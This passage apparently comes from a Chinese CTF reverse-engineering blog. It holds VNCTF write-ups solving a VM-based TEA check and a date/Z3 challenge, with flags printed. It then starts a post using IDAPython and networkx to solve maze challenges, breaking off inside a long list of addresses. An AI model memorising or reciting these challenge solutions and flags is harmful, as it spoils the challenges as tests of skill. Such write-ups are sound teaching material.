VM-&gt;REG[0]VM-&gt;REG[0] = 3655723000VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 977540402CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 328VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 2443935368VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 1778148540CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]VM-&gt;REG[0] = 8206181CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 393VM-&gt;_eip = 3 * VM-&gt;REG[0]vm quitVM-&gt;REG[3] = 2654435769VM-&gt;REG[4] = 613452VM-&gt;REG[5] = 34589VM-&gt;REG[6] = 108471VM-&gt;REG[7] = 1230791VM-&gt;REG[8] = 0VM-&gt;REG[17] = 16VM-&gt;REG[18] = 32VM-&gt;REG[19] = 352VM-&gt;REG[10] = 0VM-&gt;REG[11] = 32VM-&gt;REG[12] = 1VM-&gt;REG[8] += VM-&gt;REG[3] sum += 2654435769VM-&gt;REG[0] = VM-&gt;REG[2] v1 VM-&gt;REG[0] *= VM-&gt;REG[17]; v1 &lt;&lt; 4VM-&gt;REG[0] += VM-&gt;REG[4] (v1 &lt;&lt; 4) + 613452VM-&gt;REG[14] = VM-&gt;REG[0] VM-&gt;REG[14] = (v1 &lt;&lt; 4) + 613452VM-&gt;REG[0] = VM-&gt;REG[2] VM-&gt;REG[0] += VM-&gt;REG[8] v1 + sumVM-&gt;REG[15] = VM-&gt;REG[0] VM-&gt;REG[15] = (v1 + sum)VM-&gt;REG[0] = VM-&gt;REG[2] VM-&gt;REG[0] /= VM-&gt;REG[18] v1 &gt;&gt; 5VM-&gt;REG[0] += VM-&gt;REG[5] (v1 &gt;&gt; 5) + 34589VM-&gt;REG[16] = VM-&gt;REG[0] VM-&gt;REG[16] = (v1 &gt;&gt; 5) + 34589VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] ^= VM-&gt;REG[15]VM-&gt;REG[0] ^= VM-&gt;REG[16]VM-&gt;REG[1] += VM-&gt;REG[0] v0 += ((v1 &lt;&lt; 4) + 613452) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + 34589)VM-&gt;REG[0] = VM-&gt;REG[1]VM-&gt;REG[0] *= VM-&gt;REG[17]; v0 &lt;&lt; 4VM-&gt;REG[0] += VM-&gt;REG[6] v0 &lt;&lt; 4 + 108471VM-&gt;REG[14] = VM-&gt;REG[0] VM-&gt;REG[14] = (v0 &lt;&lt; 4 + 108471)VM-&gt;REG[0] = VM-&gt;REG[1] VM-&gt;REG[0] += VM-&gt;REG[8] v0 + sumVM-&gt;REG[15] = VM-&gt;REG[0] VM-&gt;REG[15] = (v0 + sum)VM-&gt;REG[0] = VM-&gt;REG[1]VM-&gt;REG[0] /= VM-&gt;REG[18] v0 &gt;&gt; 5VM-&gt;REG[0] += VM-&gt;REG[7] （v0 &gt;&gt; 5) + 1230791VM-&gt;REG[16] = VM-&gt;REG[0] VM-&gt;REG[16] = (v0 &gt;&gt; 5) + 1230791VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] ^= VM-&gt;REG[15]VM-&gt;REG[0] ^= VM-&gt;REG[16] VM-&gt;REG[2] += VM-&gt;REG[0] v1 += ((v0 &lt;&lt; 4) + 108471) ^ (v0 + sum) ^ (v0 &gt;&gt; 5) + 1230791VM-&gt;REG[11] -= VM-&gt;REG[12]CMP VM-&gt;REG[10], VM-&gt;REG[11] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;_eip = 3 * VM-&gt;REG[20]nopVM-&gt;REG[0] = 110 # NOputcharVM-&gt;REG[0] = 111putcharVM-&gt;_eip = 3 * VM-&gt;REG[20]nopVM-&gt;REG[0] = 121 # YESputcharVM-&gt;REG[0] = 101putcharVM-&gt;REG[0] = 115putcharVM-&gt;_eip = 3 * VM-&gt;REG[20]nopnop 一点点分析，发现是tea加密，提取出密文和key，解密即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;//加密函数void encrypt(uint32_t *v, uint32_t *k)&#123; uint32_t v0 = v[0], v1 = v[1], sum = 0, i; /* set up */ uint32_t delta = 0x9e3779b9; /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); &#125; /* end cycle */ v[0] = v0; v[1] = v1;&#125;//解密函数void decrypt(uint32_t *v, uint32_t *k)&#123; uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; /* set up */ uint32_t delta = 0x9e3779b9; /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) &#123; /* basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; &#125; /* end cycle */ v[0] = v0; v[1] = v1;&#125;int main()&#123; uint32_t key[] = &#123;613452, 34589, 108471, 1230791&#125;; uint32_t v[12] = &#123; 3906065887, 4125344020, 579781142, 2312395361, 1700499305, 612671610, 3655723000, 977540402, 2443935368, 1778148540, 8206181, 0&#125;; for (int i = 0; i &lt; 5; i++) &#123; decrypt(&amp;v[2 * i], key); &#125; printf(&quot;%s&quot;, (char *)v); return 0;&#125;// VNCTF&#123;ecd63ae5-8945-4ac4-b5a5-34fc3ade81e7&#125; 4.时空飞行IDA打开，发现流程非常的清晰，就是时间的问题。。。 先判断输入的日期 写脚本直接逆即可 12345678910111213141516171819202122232425262728293031323334353637from z3 import *from Crypto.Util.number import *def __ROL4__(a1, num): return (a1 &lt;&lt; num) &amp; 0XFFFFFFFF | (a1 &gt;&gt; (32-num)) &amp; 0xFFFFFFFFdef __ROR4__(a1, num): return (a1 &gt;&gt; num) &amp; 0XFFFFFFFF | (a1 &lt;&lt; (32-num)) &amp; 0xFFFFFFFFdef sub_401A3B(a1): return (a1 ^ __ROL4__(a1, 13) ^ __ROR4__(a1, 9)) &amp; 0XFFFFFFFFCK = [0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269, 0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9, 0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249, 0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9, 0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229, 0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299, 0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209, 0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279]dword_404040 = [0xFD07C452, 0xEC90A488, 0x68D33CD1, 0x96F64587]FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC]v5 = [0] * 32 + dword_404040j = 32for i in range(32): # 得到前面32个数 v5[j-1] = sub_401A3B(v5[j] ^ v5[j+1] ^ v5[j+2] ^ CK[j-1]) ^ v5[j+3] j = j - 1c = v5[:4]c = [c[i] ^ FK[i] for i in range(4)]data = b&quot;&quot;for i in range(4): data += long_to_bytes(c[i])print(data)# 0211205 然后再往下，用Z3解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from z3 import *from Crypto.Util.number import *flag = [BitVec(&quot;flag1_%d&quot; % i, 32) for i in range(66)]# len = 24dword_404080 = [0x00000025, 0x00000015, 0x000000DF, 0x000000A2, 0x000000C0, 0x00000093, 0x000000AD, 0x00000014, 0x00000046, 0x000000C5, 0x0000000F, 0x0000002E, 0x0000009A, 0x000000EB, 0x00000030, 0x000000F8, 0x00000020, 0x000000E9, 0x000000CB, 0x00000088, 0x000000C6, 0x000000BE, 0x0000008D, 0x000000E3]dword_4050C0 = [0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000]def HIBYTE(a1): return (a1 &gt;&gt; 24) &amp; 0XFFdef BYTE2(a1): return (a1 &gt;&gt; 16) &amp; 0XFFdef BYTE1(a1): return (a1 &gt;&gt; 8) &amp; 0XFFdef BYTE(a1): return a1 &amp; 0XFFdef sub_401FFB(a1, a2): v3 = [0] * 7 # sub_401EFB v3[0] = HIBYTE(a1) v3[1] = BYTE2(a1) v3[2] = BYTE1(a1) v3[3] = BYTE(a1) # sub_401F67 tmp = [0] * 6 for i in range(4): tmp[i] = v3[i] v4 = 1 for i in range(4): v3[i] = tmp[v4] v4 = v4 + 1 v4 = v4 % 4 # sub_401EA7 v4 = (v3[3] &amp; 0XFFFFFFFF) | ((v3[2] &lt;&lt; 8) &amp; 0XFFFFFFFF) | ( (v3[1] &lt;&lt; 16) &amp; 0XFFFFFFFF) | ((v3[0] &lt;&lt; 24) &amp; 0XFFFFFFFF) return (v4 ^ dword_4050C0[a2]) &amp; 0XFFFFFFFF# flag = [0X31323334, 0X35363738, 0X39303132,# 0x33343536, 0x37383930, 0x31323334] + [0] * 60v5 = 6v3 = 0while v5 &lt;= 65: if v5 % 6: flag[v5] = flag[v5 - 6] ^ flag[v5 - 1] else: v2 = flag[v5 - 6] flag[v5] = v2 ^ sub_401FFB(flag[v5 - 1], v3) v3 = v3 + 1 v5 = v5 + 1v4 = [0] * 24for i in range(6): v4[4 * i] = BYTE(flag[i + 60]) v4[4 * i + 1] = BYTE1(flag[i + 60]) v4[4 * i + 2] = BYTE2(flag[i + 60]) v4[4 * i + 3] = HIBYTE(flag[i + 60])for i in range(1, 24, 1): v4[i - 1] ^= (v4[i - 1] % 18 + v4[i] + 5) ^ 0x41s = Solver()for i in range(24): s.add(v4[i] == dword_404080[i])s.add(flag[0] == 1447969620) # VNCTassert s.check() == satprint(&quot;SUCCESS&quot;)m = s.model()real_flag = b&quot;&quot;for i in range(6): real_flag += long_to_bytes(m[flag[i]].as_long())print(real_flag)# VNCTF&#123;TimeFlightMachine&#125; 去掉空字符为flag： VNCTF{TimeFl20211205ightMachine}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"vm","slug":"vm","permalink":"https://zzzzsky.github.io/tags/vm/"}]},{"title":"networkx 解决CTF_RE图最短路径问题","slug":"networkx解决CTF_RE图问题","date":"2021-12-09T07:38:00.000Z","updated":"2021-12-09T07:40:22.708Z","comments":true,"path":"2021/12/09/networkx解决CTF_RE图问题/","link":"","permalink":"https://zzzzsky.github.io/2021/12/09/networkx%E8%A7%A3%E5%86%B3CTF_RE%E5%9B%BE%E9%97%AE%E9%A2%98/","excerpt":"","text":"networkx 解决CTF_RE图最短路径问题前言最近复现了了下今年L3HCTF的IDAAAAA题，然后通过此题又联想到了之前做的一道特殊的迷宫题invisible_maze-fix,发现通过python的networkx解决此类问题相当的方便，因此记录下解题过程，方便以后查询。 2道题目附件👇 链接：https://pan.baidu.com/s/1reVYGScanSCs5H4ykl60vw提取码：kvhl invisible_maze常规的迷宫题目在CTF逆向题目中，常规的迷宫题目一般是程序给你一个非常长的字符串，然后自己整理可以得到整个迷宫的全貌，比如下图这种 这种能很容易的得到整个迷宫的路径，可是这个invisible_maze这个题才可以说是是真正的迷宫题，因为它没有从上帝视角给你路径的全貌，而是把你放到了个迷宫中，每走一步，它告诉你，上下左右分别去哪 本题题解分析IDA打开程序分析 进入sub_401050函数， 程序告诉你上下左右走的话是什么东西，很明显，只有进入另一个函数路才是通的 直接查找字符串，交叉引用来到成功的地方 可以发现只有进入到sub_41F1E0,然后再按s才会成功，而整个迷宫的路径是非常复杂的 观察函数窗口，发现从sub_401050 到 sub_41F270 全是这样的结构，我们手动的去画出整个迷宫显然是不现实的，每个函数其实就是一个节点，然后两个节点就构成了一条边，比如：sub_401050就是一个节点，而sub_401050 ---&gt; sub_4010E0就是一条边。 每个函数的结构基本差不多，考虑打算用IDAPython打印出每个节点，以及它对应的adsw对应的四个值，如果是进入另外一个函数的话，那么本函数和进入的那个函数就构造成了一条边，最后将节点和边传入python的networkx库就能构造出整个迷宫图，直接调用函数就能求最短路径了。 发现函数只有下面2种情况 当经过case表跳转后，如果第一条汇编指令是push xxx，那么肯定是不通的（除了成功的那个位置），如果是call sub_xxx的话，那么本条汇编指令就可以找到下一个函数（节点），如果是pop esi的话，下一条jmp xxx就是进入的下一个函数（节点） 编写IDAPython脚本写IDAPython脚本 1234567891011121314151617181920212223242526272829303132333435363738def get_edges_from_func(func_addr): func_end_addr = idc.find_func_end(func_addr) # 找到此函数末尾地址 addr = func_addr while addr &lt; func_end_addr: addr = idc.next_head(addr) # 得到下一条汇编指令的地址 if idc.print_insn_mnem(addr) == &#x27;movzx&#x27;: # 得到本条汇编指令的操作指令 index_table_addr = get_operand_value(addr ,1) # 得到adsw对应的索引表，对应上2图的0x4010C0 和 0x41E384 addr = idc.next_head(addr) # 来到Jmp ds:xxxx[eax * 4]的位置 switch_table_addr = get_operand_value(addr ,0) # 得到case表的地址 break value = get_bytes(index_table_addr, 23) index_adws = [value[0], value[3], value[18], value[22]] # 获取adsw对应的4个数 # print(index_adws) edges = [] for i in index_adws: # 遍历 tmp = get_wide_dword(switch_table_addr + i * 4) if idc.print_insn_mnem(tmp) == &#x27;push&#x27;: edges.append(None) elif idc.print_insn_mnem(tmp) == &#x27;call&#x27;: edges.append(get_operand_value(tmp ,0)) # 得到call的那个函数的地址 elif idc.print_insn_mnem(tmp) == &#x27;pop&#x27;: tmp = idc.next_head(tmp) # 来到jmp sub_xxx的地址 edges.append(get_operand_value(tmp ,0)) # print(edges) return edgesfunc_list = list(Functions(0x401050, 0x41F271)) # 列出此范围所有的函数all_edges = []for i in func_list: edges = get_edges_from_func(i) all_edges.append(edges)print(all_edges)print(&quot;len(func_list): %d&quot; % len(func_list))print(&quot;len(all_edges): %d&quot; % len(all_edges))print(func_list) 输入结果 1234[[None, 4198624, None, None], [4198480, None, 4198784, None], [None, None, 4207712, 4198624], [None, 4199104, 4211312, None], [4198944, 4199264, None, None], [4199104, 4199424, None, None], [4199264, 4199584, None, None], [4199424, 4199744, None, None], [4199584, 4199904, 4211472, None], [4199744, 4200064, None, None], [4199904, 4200224, None, None], [4200064, 4200384, None, None], [4200224, 4200544, None, None], [4200384, 4200688, None, None], [4200544, 4200848, None, None], [4200688, 4201008, None, None], [4200848, 4201168, None, None], [4201008, 4201312, None, None], [4201168, 4201456, None, None], [4201312, 4201616, None, None], [4201456, 4201776, None, None], [4201616, 4201936, None, None], [4201776, 4202096, None, None], [4201936, 4202240, None, None], [4202096, 4202384, None, None], [4202240, 4202544, None, None], [4202384, 4202704, None, None], [4202544, 4202848, None, None], [4202704, 4203008, None, None], [4202848, 4203168, None, None], [4203008, 4203328, None, None], [4203168, 4203488, None, None], [4203328, 4203648, None, None], [4203488, 4203808, None, None], [4203648, 4203968, None, None], [4203808, 4204128, None, None], [4203968, 4204272, None, None], [4204128, 4204432, None, None], [4204272, 4204592, None, None], [4204432, 4204752, None, None], [4204592, 4204912, None, None], [4204752, 4205056, None, None], [4204912, 4205216, None, None], [4205056, 4205376, None, None], [4205216, 4205536, None, None], [4205376, None, 4211632, None], [None, 4205824, 4211792, None], [4205680, 4205984, None, None], [4205824, 4206144, None, None], [4205984, 4206304, None, None], [4206144, 4206448, None, None], [4206304, 4206608, None, None], [4206448, 4206768, None, None], [4206608, 4206928, None, None], [4206768, 4207088, None, None], [4206928, 4207232, None, None], [4207088, 4207392, None, None], [4207232, 4207552, None, None], [4207392, None, 4211952, None], [None, 4207872, None, 4198784], [4207712, 4208032, None, None], [4207872, 4208192, None, None], [4208032, 4208352, None, None], [4208192, 4208496, None, None], [4208352, 4208656, None, None], [4208496, 4208816, None, None], [4208656, 4208960, None, None], [4208816, 4209120, 4212112, None], [4208960, 4209280, None, None], [4209120, 4209440, None, None], [4209280, 4209600, None, None], [4209440, 4209760, None, None], [4209600, 4209904, None, None], [4209760, 4210064, None, None], [4209904, 4210224, None, None], [4210064, 4210368, None, None], [4210224, 4210528, None, None], [4210368, 4210688, 4212272, None], [4210528, 4210832, None, None], [4210688, 4210992, None, None], [4210832, 4211152, None, None], [4210992, 4211312, None, None], [4211152, None, None, 4198944], [None, None, 4212432, 4199744], [None, None, 4216832, 4205536], [None, None, 4216992, 4205680], [None, None, 4217136, 4207552], [None, None, 4218240, 4208960], [None, None, 4218400, 4210528], [None, None, 4218560, 4211472], [None, 4212752, 4218720, None], [4212592, 4212912, None, None], [4212752, 4213072, None, None], [4212912, 4213232, None, None], [4213072, 4213392, None, None], [4213232, 4213552, None, None], [4213392, 4213696, None, None], [4213552, 4213856, None, None], [4213696, 4214016, None, None], [4213856, 4214176, None, None], [4214016, 4214320, None, None], [4214176, 4214480, None, None], [4214320, 4214640, None, None], [4214480, 4214800, None, None], [4214640, 4214960, None, None], [4214800, 4215120, None, None], [4214960, 4215280, None, None], [4215120, 4215440, None, None], [4215280, 4215584, None, None], [4215440, 4215744, None, None], [4215584, 4215904, None, None], [4215744, 4216064, None, None], [4215904, 4216208, None, None], [4216064, 4216352, None, None], [4216208, 4216512, None, None], [4216352, 4216672, None, None], [4216512, None, 4218880, None], [None, None, 4219040, 4211632], [None, None, 4219200, 4211792], [None, None, 4219360, 4211952], [None, 4217440, 4219520, None], [4217296, 4217600, None, None], [4217440, 4217760, None, None], [4217600, 4217920, None, None], [4217760, 4218080, None, None], [4217920, None, 4219680, None], [None, None, 4219840, 4212112], [None, None, 4219984, 4212272], [None, None, 4220144, 4212432], [None, None, 4220304, 4212592], [None, None, 4220464, 4216672], [None, None, 4220608, 4216832], [None, None, 4220768, 4216992], [None, None, 4222032, 4217136], [None, None, 4222192, 4217296], [None, None, 4222352, 4218080], [None, None, 4222496, 4218240], [None, None, 4222640, 4218400], [None, None, 4223248, 4218560], [None, None, 4223856, 4218720], [None, None, 4225584, 4218880], [None, None, 4225744, 4219040], [None, 4220928, None, 4219200], [4220768, 4221088, None, None], [4220928, 4221232, None, None], [4221088, 4221392, None, None], [4221232, 4221552, None, None], [4221392, 4221712, None, None], [4221552, 4221872, None, None], [4221712, None, 4225888, None], [None, None, 4226048, 4219360], [None, None, 4226208, 4219520], [None, None, 4226688, 4219680], [None, None, 4227008, 4219840], [None, None, 4227168, 4219984], [None, 4222928, None, None], [4222800, 4223088, None, None], [4222928, 4223248, None, None], [4223088, 4223408, None, 4220144], [4223248, 4223568, None, None], [4223408, 4223712, None, None], [4223568, None, None, None], [None, None, 4227328, 4220304], [None, 4224176, 4227488, None], [4224016, 4224336, None, None], [4224176, 4224496, None, None], [4224336, 4224656, None, None], [4224496, 4224816, None, None], [4224656, 4224976, None, None], [4224816, 4225120, None, None], [4224976, 4225264, None, None], [4225120, 4225424, None, None], [4225264, None, 4227648, None], [None, None, 4227808, 4220464], [None, None, 4227968, 4220608], [None, None, 4228112, 4221872], [None, None, 4228272, 4222032], [None, None, 4228576, 4222192], [None, 4226528, 4228736, None], [4226368, 4226688, None, None], [4226528, None, None, 4222352], [None, 4227008, 4228896, None], [4226848, None, None, 4222496], [None, None, 4229056, 4222640], [None, None, 4229680, 4223856], [None, None, 4229840, 4224016], [None, None, 4230928, 4225424], [None, None, 4231088, 4225584], [None, None, 4231248, 4225744], [None, None, 4232208, 4225888], [None, 4228416, None, 4226048], [4228272, None, 4232368, None], [None, None, 4232672, 4226208], [None, None, 4232832, 4226368], [None, None, 4232992, 4226848], [None, None, 4233152, 4227168], [None, 4229376, 4233312, None], [4229216, 4229520, None, None], [4229376, 4229680, None, None], [4229520, None, None, 4227328], [None, 4229984, None, 4227488], [4229840, 4230144, None, None], [4229984, 4230288, None, None], [4230144, 4230448, None, None], [4230288, 4230608, None, None], [4230448, 4230768, None, None], [4230608, None, 4233472, None], [None, None, 4233616, 4227648], [None, None, 4233776, 4227808], [None, None, 4233920, 4227968], [None, 4231568, 4234080, None], [4231408, 4231728, None, None], [4231568, 4231888, None, None], [4231728, 4232048, None, None], [4231888, None, 4234240, None], [None, None, 4234400, 4228112], [None, 4232528, None, 4228416], [4232368, None, 4234560, None], [None, None, 4234880, 4228576], [None, None, 4235328, 4228736], [None, None, 4235792, 4228896], [None, None, 4236576, 4229056], [None, None, 4236736, 4229216], [None, None, 4238784, 4230768], [None, None, 4238944, 4230928], [None, None, 4239104, 4231088], [None, None, 4239264, 4231248], [None, None, 4239424, 4231408], [None, None, 4239584, 4232048], [None, None, 4239744, 4232208], [None, 4234720, None, 4232528], [4234560, None, 4239904, None], [None, 4235040, None, 4232672], [4234880, 4235200, None, None], [4235040, 4235328, None, None], [4235200, None, 4240064, 4232832], [None, 4235632, 4240368, None], [4235488, 4235792, None, None], [4235632, 4235952, None, 4232992], [4235792, 4236112, None, None], [4235952, 4236272, None, None], [4236112, 4236432, None, None], [4236272, None, None, None], [None, None, 4240528, 4233152], [None, 4236896, None, 4233312], [4236736, 4237056, None, None], [4236896, 4237216, None, None], [4237056, 4237376, None, None], [4237216, 4237520, None, None], [4237376, 4237664, None, None], [4237520, 4237824, None, None], [4237664, 4237984, None, None], [4237824, 4238144, None, None], [4237984, 4238304, None, None], [4238144, 4238464, None, None], [4238304, 4238624, None, None], [4238464, 4238784, None, None], [4238624, None, None, 4233472], [None, None, 4240688, 4233616], [None, None, 4240848, 4233776], [None, None, 4241008, 4233920], [None, None, 4241168, 4234080], [None, None, 4241312, 4234240], [None, None, 4241456, 4234400], [None, None, 4241616, 4234720], [None, 4240224, None, 4235328], [4240064, 4240368, None, None], [4240224, None, None, 4235488], [None, None, 4241776, 4236576], [None, None, 4246640, 4238944], [None, None, 4246800, 4239104], [None, None, 4246960, 4239264], [None, None, 4247120, 4239424], [None, None, 4247280, 4239584], [None, None, 4247440, 4239744], [None, None, 4247904, 4239904], [None, 4241936, None, 4240528], [4241776, 4242096, None, None], [4241936, 4242256, None, None], [4242096, 4242416, None, None], [4242256, 4242576, None, None], [4242416, 4242736, None, None], [4242576, 4242896, None, None], [4242736, 4243040, None, None], [4242896, 4243200, None, None], [4243040, 4243360, None, None], [4243200, 4243504, None, None], [4243360, 4243664, None, None], [4243504, 4243824, None, None], [4243664, 4243984, None, None], [4243824, 4244144, None, None], [4243984, 4244288, None, None], [4244144, 4244448, None, None], [4244288, 4244608, None, None], [4244448, 4244768, None, None], [4244608, 4244928, None, None], [4244768, 4245072, None, None], [4244928, 4245232, None, None], [4245072, 4245392, None, None], [4245232, 4245536, None, None], [4245392, 4245696, None, None], [4245536, 4245840, None, None], [4245696, 4246000, None, None], [4245840, 4246160, None, None], [4246000, 4246320, None, None], [4246160, 4246480, None, None], [4246320, 4246640, None, None], [4246480, None, None, 4240688], [None, None, 4248064, 4240848], [None, None, 4248224, 4241008], [None, None, 4248384, 4241168], [None, None, 4248544, 4241312], [None, None, 4248704, 4241456], [None, None, 4248864, None], [None, 4247904, 4249184, None], [4247744, None, None, 4241616], [None, None, 4257312, 4246800], [None, None, 4257472, 4246960], [None, None, 4257632, 4247120], [None, None, 4257760, 4247280], [None, None, 4257920, 4247440], [None, 4249024, 4258080, 4247600], [4248864, 4249184, None, None], [4249024, None, None, 4247744], [None, 4249504, 4258240, None], [4249344, 4249664, None, None], [4249504, 4249824, None, None], [4249664, 4249984, None, None], [4249824, 4250144, None, None], [4249984, 4250304, None, None], [4250144, 4250464, None, None], [4250304, 4250624, None, None], [4250464, 4250784, None, None], [4250624, 4250944, None, None], [4250784, 4251088, None, None], [4250944, 4251248, None, None], [4251088, 4251408, None, None], [4251248, 4251568, None, None], [4251408, 4251712, None, None], [4251568, 4251872, None, None], [4251712, 4252032, None, None], [4251872, 4252192, None, None], [4252032, 4252336, None, None], [4252192, 4252496, None, None], [4252336, 4252656, None, None], [4252496, 4252816, None, None], [4252656, 4252976, None, None], [4252816, 4253136, None, None], [4252976, 4253296, None, None], [4253136, 4253456, None, None], [4253296, 4253616, None, None], [4253456, 4253776, None, None], [4253616, 4253936, None, None], [4253776, 4254096, None, None], [4253936, 4254240, None, None], [4254096, 4254400, None, None], [4254240, 4254544, None, None], [4254400, 4254704, None, None], [4254544, 4254848, None, None], [4254704, 4255008, None, None], [4254848, 4255152, None, None], [4255008, 4255312, None, None], [4255152, 4255472, None, None], [4255312, 4255616, None, None], [4255472, 4255776, None, None], [4255616, 4255936, None, None], [4255776, 4256080, None, None], [4255936, 4256240, None, None], [4256080, 4256400, None, None], [4256240, 4256560, None, None], [4256400, 4256704, None, None], [4256560, 4256848, None, None], [4256704, 4257008, None, None], [4256848, 4257152, None, None], [4257008, None, 4258400, None], [None, None, 4258544, 4248064], [None, None, 4258704, 4248224], [None, None, None, 4248384], [None, None, 4258864, 4248544], [None, None, 4259024, 4248704], [None, None, 4259184, 4248864], [None, None, 4259344, 4249344], [None, None, 4263760, 4257152], [None, None, 4263920, 4257312], [None, None, 4264080, 4257472], [None, None, 4265200, 4257760], [None, None, 4265344, 4257920], [None, None, 4265504, 4258080], [None, None, 4265648, 4258240], [None, 4259648, 4265792, None], [4259488, 4259808, None, None], [4259648, 4259968, None, None], [4259808, 4260128, None, None], [4259968, None, 4265952, None], [None, 4260448, 4266112, None], [4260288, 4260592, None, None], [4260448, 4260752, None, None], [4260592, 4260912, None, None], [4260752, 4261072, None, None], [4260912, 4261232, None, None], [4261072, 4261392, None, None], [4261232, 4261552, None, None], [4261392, 4261712, None, None], [4261552, 4261872, None, None], [4261712, 4262032, None, None], [4261872, 4262176, None, None], [4262032, 4262320, None, None], [4262176, 4262480, None, None], [4262320, 4262640, None, None], [4262480, 4262800, None, None], [4262640, 4262960, None, None], [4262800, 4263120, None, None], [4262960, 4263280, None, None], [4263120, 4263440, None, None], [4263280, 4263600, None, None], [4263440, None, 4266272, None], [None, None, 4268496, 4258400], [None, None, 4268656, 4258544], [None, 4264240, None, 4258704], [4264080, 4264400, None, None], [4264240, 4264560, None, None], [4264400, 4264720, None, None], [4264560, 4264880, None, None], [4264720, 4265040, None, None], [4264880, 4265200, None, None], [4265040, None, None, 4258864], [None, None, 4268816, 4259024], [None, None, 4268976, 4259184], [None, None, 4269136, 4259344], [None, None, 4269296, 4259488], [None, None, 4269456, 4260128], [None, None, 4269616, 4260288], [None, 4266432, None, 4263600], [4266272, 4266592, None, None], [4266432, 4266752, None, None], [4266592, 4266912, None, None], [4266752, 4267072, None, None], [4266912, 4267232, None, None], [4267072, 4267392, None, None], [4267232, 4267552, None, None], [4267392, 4267712, None, None], [4267552, 4267872, None, None], [4267712, 4268032, None, None], [4267872, 4268192, None, None], [4268032, 4268352, None, None], [4268192, 4268496, None, None], [4268352, None, None, 4263760], [None, None, 4269760, 4263920], [None, None, 4272288, 4265344], [None, None, 4272448, 4265504], [None, None, 4272608, 4265648], [None, None, 4273392, 4265792], [None, None, 4273552, 4265952], [None, None, 4273696, 4266112], [None, 4269920, None, 4268656], [4269760, 4270080, None, None], [4269920, 4270240, None, None], [4270080, 4270400, None, None], [4270240, 4270560, None, None], [4270400, 4270720, None, None], [4270560, 4270880, None, None], [4270720, 4271040, None, None], [4270880, 4271184, None, None], [4271040, 4271328, None, None], [4271184, 4271488, None, None], [4271328, 4271648, None, None], [4271488, 4271808, None, None], [4271648, 4271968, None, None], [4271808, 4272128, None, None], [4271968, 4272288, None, None], [4272128, None, None, 4268816], [None, None, 4274480, 4268976], [None, 4272768, None, 4269136], [4272608, 4272928, None, None], [4272768, 4273088, None, None], [4272928, 4273248, None, None], [4273088, 4273392, None, None], [4273248, None, None, 4269296], [None, None, 4274640, 4269456], [None, None, 4274800, 4269616], [None, 4274000, 4277808, None], [4273840, 4274160, None, None], [4274000, 4274320, None, None], [4274160, None, 4277968, None], [None, None, 4284896, 4272448], [None, None, 4286496, 4273552], [None, 4274960, None, 4273696], [4274800, 4275120, None, None], [4274960, 4275280, None, None], [4275120, 4275440, None, None], [4275280, 4275584, None, None], [4275440, 4275744, None, None], [4275584, 4275904, None, None], [4275744, 4276064, None, None], [4275904, 4276208, None, None], [4276064, 4276368, None, None], [4276208, 4276528, None, None], [4276368, 4276688, None, None], [4276528, 4276848, None, None], [4276688, 4277008, None, None], [4276848, 4277168, None, None], [4277008, 4277328, None, None], [4277168, 4277488, None, None], [4277328, 4277648, None, None], [4277488, 4277808, None, None], [4277648, None, None, 4273840], [None, 4278128, None, 4274320], [4277968, 4278288, None, None], [4278128, 4278448, None, None], [4278288, 4278608, None, None], [4278448, 4278768, None, None], [4278608, 4278928, None, None], [4278768, 4279072, None, None], [4278928, 4279216, None, None], [4279072, 4279376, None, None], [4279216, 4279536, None, None], [4279376, 4279696, None, None], [4279536, 4279840, None, None], [4279696, 4280000, None, None], [4279840, 4280160, None, None], [4280000, 4280304, None, None], [4280160, 4280464, 